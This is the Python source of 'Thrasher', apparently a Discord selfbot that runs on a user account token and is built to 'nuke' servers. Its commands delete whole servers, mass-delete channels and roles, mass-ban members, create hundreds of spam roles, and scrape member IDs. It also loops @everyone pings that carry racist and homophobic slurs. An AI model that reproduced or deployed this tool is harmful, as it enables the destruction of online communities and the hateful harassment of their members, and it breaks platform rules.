
from wsgiref import headers
import discord, json, ctypes, colorama, os, random, requests, time
from colorama import Fore, init
from discord.ext import commands
init()
os.system("cls")
with open ('config.json') as f:
    config = json.load(f)
prefix = config.get('prefix')
token = config.get('token')

    
intents = discord.Intents.all()
thrasher = commands.Bot(prefix, self_bot = True, intents=intents)
thrasher.remove_command("help")
botversion = "v1.0"
emcolor = 0x2f3136
ctypes.windll.kernel32.SetConsoleTitleW(f"[Thrasher Selfbot]")
@thrasher.command()
async def cc(ctx, name):
    await ctx.message.delete()
    channel = ctx.message.guild
    await channel.create_text_channel(name)
    print(f'{Fore.WHITE}[+]|{Fore.RED}The channel {name} has been created')

@thrasher.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed=discord.Embed(title="**Thrasher Selfbot**", color=emcolor)
        embed.add_field(name="info:", value="Display's All Info Commands")
        embed.add_field(name="nuke:", value="Display All Nuke Commands")
        embed.add_field(name="fun:", value="Displays All Fun Commands")
        embed.add_field(name="admin:", value="Displays All Admin Commands")
    
        
        embed.set_footer(text = f"prefix: {prefix} | created by cult#1300")
        
    
        await ctx.send(embed=embed)
    elif str(category) == "info":
        embed=discord.Embed(title="Info Commands", color=emcolor)
        embed.add_field(name="cinfo:", value="Display's Info About The thrasher")
        embed.add_field(name="ping:", value="Shows The Bots Current Latency Ping")
        embed.add_field(name="binfo:", value="Displays Bot Info")


        await ctx.send(embed=embed)
    elif str(category) == "nuke":
        embed=discord.Embed(title="Nuke Commands", color=emcolor)
        embed.add_field(name="servdel:", value="Delete's The Current Server")
        embed.add_field(name="mcc:", value=f"Mass Creates Channels | Usage: {prefix}mcc [channelnames] ")
        embed.add_field(name="esp", value="Everyone Spam Pings")
        embed.add_field(name="espstop", value="Stop Everyone Spam Pings")
        embed.add_field(name="rs", value="Spams 250 roles")
        embed.add_field(name="mdc", value="Mass Deletes Channels")
        embed.add_field(name="mdr", value="Mass Deletes Roles")
        embed.add_field(name="massban", value="Mass Bans The Server")
        embed.add_field(name="scrape", value="Scrapes IDS From The Server")


        await ctx.send(embed=embed)
    elif str(category) == "fun":
        embed=discord.Embed(title="Fun Commands", color=emcolor)
        embed.add_field(name="memes", value="Sends Random Memes")
        
        await ctx.send(embed=embed)
    elif str(category) == "admin":
        embed=discord.Embed(title="Admin Commands", color=emcolor)
        embed.add_field(name="cr:", value=f"Create a Role | Usage: {prefix}cr [rolename]")
        embed.add_field(name="cc:", value=f"Creates a Channel | Usage: {prefix}cc [channelname]")
        embed.add_field(name="roles:", value=f"Displays all roles in the server")
        embed.add_field(name="esn:", value=f"Edits The Servers name | {prefix}esn [servername]")

        await ctx.send(embed=embed)
@thrasher.command()
async def cinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    user = ctx.author
    embed=discord.Embed(title="thrasher Info", color=emcolor)
    embed.add_field(name="User: ", value=f"{thrasher.user}", inline=True)
    embed.add_field(name="ID:", value=f"{thrasher.user.id}", inline=True)
    embed.add_field(name="Prefix:", value=f"{prefix}", inline=True)
    embed.add_field(name="Latency:", value=f"{round (thrasher.latency * 1000)} ms", inline=True)
    embed.add_field(name="Registered:", value=user.created_at.strftime(date_format), inline=True)
    embed.add_field(name=f"Version:", value=f"The Bot Is In Version: {botversion}")

    await ctx.send(embed=embed)
@thrasher.command()
async def servdel(ctx):
    await ctx.message.delete()
    server = ctx.message.guild
    await server.delete()
    print(f"{Fore.RED}[+]{server} Has Been Deleted")



@thrasher.event
async def on_ready():
    menu()

def menu():
    servers = len(thrasher.guilds)
    print(f'''{Fore.WHITE}
                           
                              {Fore.WHITE}████████╗██╗  ██╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
                              {Fore.WHITE}╚══██╔══╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
                              {Fore.WHITE}   ██║   ███████║██████╔╝███████║███████╗███████║█████╗  ██████╔╝
                               {Fore.RED}  ██║   ██╔══██║██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
                               {Fore.RED}  ██║   ██║  ██║██║  ██║██║  ██║███████║██║  ██║███████╗██║  ██║
                               {Fore.RED}  ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                 {Fore.RED}─────────────────────────     
                                                    {Fore.WHITE}Login: [{thrasher.user}]
                                                    Prefix: [{thrasher.command_prefix}]
                                                    Version: [{botversion}]
                                                    Servers: [{servers}]
                                                    Developer: [cult#1300]    
                                                  {Fore.RED}─────────────────────────
                          
                                                

    ''')

@thrasher.command()
async def ping(ctx):
    pingmsg = f"{round (thrasher.latency * 1000)} ms"
    await ctx.message.edit(content=pingmsg)
@thrasher.command()
async def mcc(ctx, name, amount):
    await ctx.message.delete()
    for i in range(int(amount)):
        channel = ctx.message.guild
        await channel.create_text_channel(name)
        print(f'{Fore.WHITE}[+]|{Fore.RED}The channel {name} has been created')
        os.system("cls")
        menu()
masspings = "@everyone GET FUCKING WHIZZED FAGGOT", "@everyone VEILSEC RUNS ALL NIGGER", " @everyone WHERES THE ANTINUKE G"
@thrasher.command()
async def esp(channel):
    await channel.message.delete()
    global espstop
    espstop = False
    while True:
        await channel.send(random.choice(masspings))
        if espstop == True:
            break
@thrasher.command()
async def espstop(ctx):
    await ctx.message.delete()
    global espstop
    espstop = True
    if espstop == True:
        await ctx.send("`Everyone spam ping is has stopped`")
memesmsgctx = "https://cdn.discordapp.com/attachments/932811437234077750/932818588744687616/video0.mov", "https://cdn.discordapp.com/attachments/932811437234077750/932819283057193000/CF24EB74-2232-4373-9BEA-A302CE2B36FA.png", "https://cdn.discordapp.com/attachments/932811437234077750/932819683697119252/video0.mp4", "https://cdn.discordapp.com/attachments/932812544081559602/932819962526048296/video0.mov"
@thrasher.command()
async def memes(ctx):
    memesmsg = memesmsgctx
    await ctx.message.delete()
    await ctx.send(random.choice(memesmsg))
@thrasher.command()
async def binfo(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="Bot Info", color=emcolor)
    embed.add_field(name="About:", value="Thrasher is a Discord Selfbot Made Completely in Python Contact Me Via Discorcd cult#1300 To Report Any Issues or Suggestions")
    embed.add_field(name="Commands:", value=f"{len(thrasher.commands)}", inline=False)
    embed.add_field(name="Developer:", value="cult#1300 | 562308294530564127")
    await ctx.send(embed=embed)
@thrasher.command()
async def cr(ctx, *, name):
	guild = ctx.guild
	await guild.create_role(name=name)
	print(f'{Fore.WHITE}[+]|{Fore.RED}Role `{name}` has been created')
@thrasher.command()
async def rs(ctx):
    await ctx.message.delete()
    guilds = ctx.guild
    for i in range(int(250)):
        await guilds.create_role(name="cult ran you")
        print(f'{Fore.WHITE}[+]|{Fore.RED}The role "cult ran you" has been created')
        os.system("cls")
        menu()
@thrasher.command()
async def scrape(ctx, guildid):
    await ctx.message.delete()
    global membercount, guildget
    await thrasher.wait_until_ready()
    guildget = thrasher.get_guild(int(guildid))
    members = await guildget.chunk()
    try:
        os.remove('scrapes/members.txt')
    except:
        pass

    membercount = 0
    with open('scrapes/members.txt', 'a') as h:
        for member in members:
            h.write(str(member.id) + "\n")
            membercount += 1
            

  
            print(f"Succesfully Scraped {membercount} Members")
    channelcount = 0
    with open('scrapes/channels.txt', 'a') as f:
        for channel in guildget.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
            print(f"Succesfully Scraped {channelcount} channels")
    rolecount = 0
    with open('scrapes/roles.txt', 'a') as r:
        for role in guildget.roles:
            r.write(str(role.id) + "\n")
            rolecount += 1
            print(f"Succesfully Scraped {rolecount} roles")
            os.system("cls")
            menu()

@thrasher.command()
async def roles(ctx):
    rr = ctx.guild.roles
    await ctx.send(rr)

@thrasher.command()
async def mdc(ctx):
    await ctx.message.delete()
    channel = open('scrapes/channels.txt')
    for channel in ctx.guild.channels:
        await channel.delete()
        print(f"Channel Was Deleted")
        os.system("cls")
        menu()
@thrasher.command()
async def massban(ctx):
    await ctx.message.delete()
    users = open('scrapes/members.txt')
    for users in ctx.guild.members:
        await users.ban()
        print("User Has Been Banned")
        os.system("cls")
        menu()
@thrasher.command()
async def mdr(ctx):
    await ctx.message.delete()

    for role in ctx.guild.roles:

        if str(role) == '@everyone':
            continue

        try:
            await role.delete()
        except discord.Forbidden:
            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        else:
            print(f"{role.name} has been deleted in {ctx.guild.name}")
            os.system("cls")

    print("Roles deleted skid")
    os.system("cls")
    menu()
@thrasher.command()
async def esn(ctx, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
@thrasher.command()
async def cls(ctx):
    await ctx.message.delete()
    os.system("cls")
    menu()
thrasher.run(token, bot=False)
